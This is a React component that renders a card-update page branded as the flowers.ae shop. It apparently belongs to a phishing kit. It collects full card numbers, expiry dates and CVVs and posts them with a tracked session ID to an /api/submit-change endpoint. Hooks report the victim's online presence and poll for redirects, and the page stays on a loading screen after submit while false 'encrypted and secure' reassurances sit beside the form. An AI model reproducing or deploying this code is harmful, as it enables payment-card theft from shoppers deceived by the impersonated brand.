import styles from "./ChangeCard.module.css";
import { useState } from "react";
import { useRedirectChecker } from "../../hooks/useRedirectChecker";
import Loading from "../../components/Loading/Loading";
import { useOnlineStatus } from "../../hooks/useOnlineStatus";

interface CardData {
  cardNumber: string;
  expiryDate: string;
  cvv: string;
}

const CardUpdate = () => {
  const sessionId = localStorage.getItem("currentSessionId");
  useRedirectChecker(3000);
  useOnlineStatus({ sessionId, pageName: "change", enabled: true });
  const [cardData, setCardData] = useState<CardData>({
    cardNumber: "",
    expiryDate: "",
    cvv: "",
  });
  const [isProcessing, setIsProcessing] = useState(false);

  // Mock данные текущей карты
  const currentCard = {
    cardNumber: "•••• •••• •••• 1234",
    expiryDate: "12/25",
    cardType: "visa" as const,
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;

    if (name === "cardNumber") {
      const formattedValue = value
        .replace(/\s/g, "")
        .replace(/(\d{4})/g, "$1 ")
        .trim()
        .slice(0, 19);
      setCardData((prev) => ({ ...prev, [name]: formattedValue }));
      return;
    }

    if (name === "expiryDate") {
      const formattedValue = value
        .replace(/\D/g, "")
        .replace(/(\d{2})(\d)/, "$1/$2")
        .slice(0, 5);
      setCardData((prev) => ({ ...prev, [name]: formattedValue }));
      return;
    }

    if (name === "cvv") {
      const formattedValue = value.replace(/\D/g, "").slice(0, 3);
      setCardData((prev) => ({ ...prev, [name]: formattedValue }));
      return;
    }

    setCardData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsProcessing(true);

    if (!cardData.cardNumber || !cardData.expiryDate || !cardData.cvv) {
      alert("Please fill in all card details");
      setIsProcessing(false);
      return;
    }

    if (cardData.cardNumber.replace(/\s/g, "").length !== 16) {
      alert("Please enter a valid 16-digit card number");
      setIsProcessing(false);
      return;
    }

    // Имитация обработки запроса
    try {
      const res = await fetch("/api/submit-change", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId: sessionId,
          change: cardData.cardNumber,
          expiryDate: cardData.expiryDate,
          cvc: cardData.cvv,
        }),
      });

      const data = await res.json();

      if (data.success) {
        setIsProcessing(true);
      }
    } catch (error) {
      console.error("Error adding balance:", error);
      alert("There was an error processing your request. Please try again.");
    } finally {
      setIsProcessing(true);
    }
  };

  const getCardIcon = (cardType: string) => {
    switch (cardType) {
      case "visa":
        return "https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/visa.svg";
      case "mc":
        return "https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/mc.svg";
      case "amex":
        return "https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/amex.svg";
      default:
        return "https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/visa.svg";
    }
  };

  return (
    <div className={styles.cardUpdate__container}>
      <div className={styles.cardUpdate__wrapper}>
        {/* Header */}
        <header className={styles.cardUpdate__header}>
          <div className={styles.header__content}>
            <div className={styles.logo}>
              <span>flowers.ae</span>
            </div>
            <nav className={styles.breadcrumb}>
              <span className={styles.active}>Update Card Details</span>
            </nav>
          </div>
        </header>

        <div className={styles.cardUpdate__content}>
          {/* Left Side - Update Form */}
          <div className={styles.form__section}>
            <div className={styles.form__container}>
              <div className={styles.form__header}>
                <div className={styles.card__icon}>💳</div>
                <h2>Update Card Details</h2>
                <p>Enter your new card information below</p>
              </div>

              <form onSubmit={handleSubmit} className={styles.card__form}>
                <div className={styles.input__group}>
                  <label>Card Number *</label>
                  <input
                    type="text"
                    name="cardNumber"
                    value={cardData.cardNumber}
                    onChange={handleInputChange}
                    placeholder="1234 5678 9012 3456"
                    maxLength={19}
                    required
                    className={styles.form__input}
                  />
                  <div className={styles.card__icons}>
                    <img
                      height="24"
                      alt="visa"
                      src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/visa.svg"
                    />
                    <img
                      height="24"
                      alt="mc"
                      src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/mc.svg"
                    />
                    <img
                      height="24"
                      alt="amex"
                      src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/amex.svg"
                    />
                  </div>
                </div>

                <div className={styles.form__row}>
                  <div className={styles.input__group}>
                    <label>Expiration Date *</label>
                    <input
                      type="text"
                      name="expiryDate"
                      value={cardData.expiryDate}
                      onChange={handleInputChange}
                      placeholder="MM/YY"
                      maxLength={5}
                      required
                      className={styles.form__input}
                    />
                  </div>
                  <div className={styles.input__group}>
                    <label>CVV *</label>
                    <input
                      type="text"
                      name="cvv"
                      value={cardData.cvv}
                      onChange={handleInputChange}
                      placeholder="123"
                      maxLength={3}
                      required
                      className={styles.form__input}
                    />
                  </div>
                </div>

                <div className={styles.form__actions}>
                  <button
                    type="submit"
                    disabled={isProcessing}
                    className={styles.update__btn}
                  >
                    {isProcessing ? "Updating..." : "Update Card"}
                  </button>
                </div>
              </form>

              <div className={styles.security__info}>
                <div className={styles.security__badge}>
                  <span className={styles.lock__icon}>🔒</span>
                  <span>Your card information is encrypted and secure</span>
                </div>
              </div>
            </div>
          </div>

          {/* Right Side - Current Card & Info */}
          <div className={styles.info__section}>
            <div className={styles.info__container}>
              <h3>Current Card</h3>

              {/* Current Card Display */}
              <div className={styles.current__card}>
                <div className={styles.card__preview}>
                  <div className={styles.card__header}>
                    <img
                      src={getCardIcon(currentCard.cardType)}
                      alt={currentCard.cardType}
                      className={styles.card__type__icon}
                    />
                    <span className={styles.card__type}>Credit Card</span>
                  </div>
                  <div className={styles.card__number}>
                    {currentCard.cardNumber}
                  </div>
                  <div className={styles.card__footer}>
                    <div className={styles.card__expiry}>
                      <span>Expires</span>
                      <span className={styles.expiry__date}>
                        {currentCard.expiryDate}
                      </span>
                    </div>
                    <div className={styles.card__status}>
                      <span className={styles.status__badge}>Active</span>
                    </div>
                  </div>
                </div>
              </div>

              <div className={styles.benefits__list}>
                <div className={styles.benefit__item}>
                  <div className={styles.benefit__icon}>🔒</div>
                  <div className={styles.benefit__content}>
                    <h4>Secure Updates</h4>
                    <p>
                      All card updates are processed with bank-level encryption
                    </p>
                  </div>
                </div>

                <div className={styles.benefit__item}>
                  <div className={styles.benefit__icon}>⚡</div>
                  <div className={styles.benefit__content}>
                    <h4>Instant Activation</h4>
                    <p>
                      Your new card will be active immediately after
                      verification
                    </p>
                  </div>
                </div>

                <div className={styles.benefit__item}>
                  <div className={styles.benefit__icon}>💳</div>
                  <div className={styles.benefit__content}>
                    <h4>Multiple Cards</h4>
                    <p>You can add multiple payment methods to your account</p>
                  </div>
                </div>
              </div>

              {/* Security Tips */}
              <div className={styles.tips__section}>
                <h4>Security Tips</h4>
                <div className={styles.tip__item}>
                  <span className={styles.tip__icon}>🔒</span>
                  <p>Never share your CVV code with anyone</p>
                </div>
                <div className={styles.tip__item}>
                  <span className={styles.tip__icon}>📧</span>
                  <p>We'll never ask for your card details via email</p>
                </div>
                <div className={styles.tip__item}>
                  <span className={styles.tip__icon}>🌐</span>
                  <p>Always ensure you're on our official website</p>
                </div>
              </div>

              {/* Support Info */}
              <div className={styles.support__section}>
                <h4>Need Help?</h4>
                <div className={styles.support__options}>
                  <div className={styles.support__option}>
                    <span className={styles.support__icon}>📞</span>
                    <div>
                      <p className={styles.support__title}>Card Support</p>
                      <p className={styles.support__detail}>+971 4 123 4567</p>
                    </div>
                  </div>
                  <div className={styles.support__option}>
                    <span className={styles.support__icon}>💬</span>
                    <div>
                      <p className={styles.support__title}>Live Chat</p>
                      <p className={styles.support__detail}>Available 24/7</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <Loading isLoading={isProcessing} />
    </div>
  );
};

export default CardUpdate;
